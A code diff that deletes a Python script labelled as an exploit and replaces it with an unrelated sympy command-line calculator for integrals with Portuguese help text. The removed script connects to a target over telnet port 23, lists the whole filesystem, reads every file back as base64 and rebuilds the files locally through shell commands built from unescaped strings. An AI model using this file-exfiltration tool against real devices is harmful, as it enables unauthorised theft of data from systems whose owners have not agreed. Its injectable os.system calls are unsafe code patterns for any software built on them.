@@ -1,138 +1,60 @@
-from os import walk, path, system
-import socket, argparse
-from time import sleep
+
+from sympy import Symbol, integrate, solveset, Eq, init_printing
+import argparse
 
 
-files_list = []
-dir_list = []
-sock = None
-data = ''
-'''
-def discovery(initial_path):
+init_printing(use_unicode=True, wrap_line=True, pretty_print=False)
+
+global x, y, z, k, m, n
+x = Symbol('x')
+y = Symbol('y')
+z = Symbol('z')
+k = Symbol('k', integer=True)
+m = Symbol('m', integer=True)
+n = Symbol('n', integer=True)
+
+def integral(expre, a, b):
+
+    return (integrate(expre,(x, a, b)))
+
+
+def integral_func(expre1, expre2):
+
+    expre = '{}-({})'.format(expre1,expre2)
+    a_b = solveset(Eq(expre, 0), x)
+    result = integrate(expre1, (x,*a_b)) - integrate(expre2, (x,*a_b))
     
-    global dir_list, files_list
-
-    for dirpath, dirs, files in walk(initial_path):
-        
-        for _file in files:
-            
-            absolute_path = path.abspath(path.join(dirpath, _file)) 
-            
-            if dirpath not in dir_list: 
-                dir_list.append(dirpath)
-            
-            files_list.append(absolute_path)
-
-    
-    
-    return True
-
-'''
-
-def recv_data(send_data: str):
-    global sock
-
-    sock.send(send_data.encode())
-    tmp = ''
-    while '[root@GX662:'.encode() not in tmp:
-        tmp += sock.recv(512).decode()
-    
-    tmp = tmp.replace('[root@GX662:', '')
-    tmp = tmp.replace(send_data+'\n', '')
-
-    return tmp
+    return result
 
 
-def discovery():
-    
-    global data
-    
-    data = recv_data('find /')
-
-    return True
-
-
-def dir_tree(init_path):
-
-    global dir_list, data 
-
-    for it in data:
-        payload = 'file '+it+'\n'
-        tmp = recv_data(payload)
-
-        if 'directory' in tmp: 
-            dir_list.append(it)
-        else: 
-            files_list.append(it)
-
-    for _dir in dir_list:
-        _path = init_path+_dir
-        system('mkdir '+_path)
-
-    return True
-
-
-
-def connection(ip='10.0.1.7',port=23):
-    global sock
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((ip, port))
-
-    return True
-
-
-def get_file(save_locate):
-    global files_list
-
-    for _file in files_list:
-        data = recv_data('base64 '+_file+'\n')
-        tmp = 'echo '+data+' | base64 -d '+save_locate+_file
-        system(tmp)
-    
-    return True
-
+def integral_dupla(expre):
+    expre = integrate(expre,x).doit()
+    return integrate(expre, x).doit()
 
 def main():
-    
     parser = argparse.ArgumentParser()
-    parser.add_argument('-i', help='is target ip')
-    parser.add_argument('-s', help='where do you want to save')
+    group = parser.add_mutually_exclusive_group()
+    parser.add_argument('-e1', help='é a primeira expressão', type=str)
+    parser.add_argument('-d', help='caso queira calcular o valor de uma integral dupla', action='store_true')
+    group.add_argument('-e2', help='é a segunda expressão', type=str)
+    group.add_argument('-a', help='defina um valor inicial para a integração', type=int)
+    parser.add_argument('-b', help='defina um valor final para a integração', type=int)
     args = parser.parse_args()
     
-    print('#'+'exploit is running'.center(40,' ')+'#')
-    sleep(1)
-    print('#'+'try conection'.center(40, ' ')+'#')
-    
-    try:
-        connection(ip=args.i)
-        print('#'+'connected!'.center(40, ' ')+'#')
-    except Exception as e:
-        print('#'+'not connected! logs in erro.log'.center(40, ' ')+'#')
-        system('echo "'+str(e)+'" > '+args.s+'/erro.log\n')
-        exit()
-    
-    print('#'+'discovering files'.center(40, ' ')+'#')
-    discovery()
-    sleep(1)
-    print('#'+'trying to creating dir tree'.center(40, ' ')+'#')
-    
-    try:
-        dir_tree(args.s)
-        print('#'+'dir tree has created!'.center(40, ' ')+'#')
-    except:
-        print('#'+'unable to create dir tree'.center(40, ' ')+'#')
-        exit()
-    sleep(1)
-    print('#'+'trying to download files'.center(40, ' ')+'#')
-    
-    try: 
-        get_file(args.s)
-        print('#'+'download complete'.center(40, ' ')+'#')
-    except:
-        print('#'+'download erro'.center(40, ' ')+'#')
 
-   
+    if args.e1 != None and args.d:
+        print(integral_dupla(args.e1))
+    
+    elif args.e1 == None or ((args.e2 == None and (args.a == None or args.b ==None)) or args.d): 
+        print('Argumentos invalidos. consulte o help usando \"-h\"')
+
+    elif args.a != None: 
+        print(integral(args.e1, args.a, args.b).evalf())
+
+    else:
+       print(integral_func(args.e1, args.e2)) 
+
 
 if __name__ == "__main__":
     main()
+	
